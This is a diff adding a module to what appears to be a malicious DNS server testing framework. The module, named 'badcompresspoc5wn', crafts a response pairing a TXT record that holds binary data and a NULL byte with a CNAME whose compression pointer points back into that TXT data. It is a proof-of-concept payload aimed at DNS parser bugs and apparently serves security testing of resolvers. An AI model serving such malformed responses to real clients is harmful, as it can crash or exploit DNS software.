@@ -1,0 +1,34 @@
+[module]
+name = "badcompresspoc5wn"
+info = ""
+desc = ""
+type = "feature"
+author = "ivan.jedek@oryxlabs.com"
+
+code = '''
+if req.first_subdomain.startswith("badcompresspoc5wn"):
+   # Send TXT record with some binary data and NULL
+   # + CNAME with compression pointing to the previous TXT record
+   ### DNS header ########
+   buffer = prep_dns_header(b'\x84\x00', req.QURR, 2, 0, 0)
+   ### QUESTION SECTION ########
+   if resp.noq: buffer += convDom2Bin(req.full_domain) + req.type_bin + req.class_bin
+   ### ANSWER SECTION ########
+   databin = b"\x0a\x08\x55\x66\x77\x88\x99\xaa\xbb\xcc\x00"
+   # TXT            ~~~ CNAME points here
+   buffer += convDom2Bin(req.full_domain) + getTypeBin("TXT") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)            ## TTL
+   buffer += struct.pack(">H", len(databin))        ## Data length
+   buffer += databin
+   # CNAME
+   offset_to_the_txt = (len(req.full_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
+   databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
+   buffer += convDom2Bin(req.full_domain) + getTypeBin("CNAME") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)            ## TTL
+   buffer += struct.pack(">H", len(databin))        ## Data length
+   buffer += databin
+   # log and send
+   log("TXT + CNAME (poc5 with NULL)")
+   send_buf(self, buffer)
+   #####################################################################
+'''
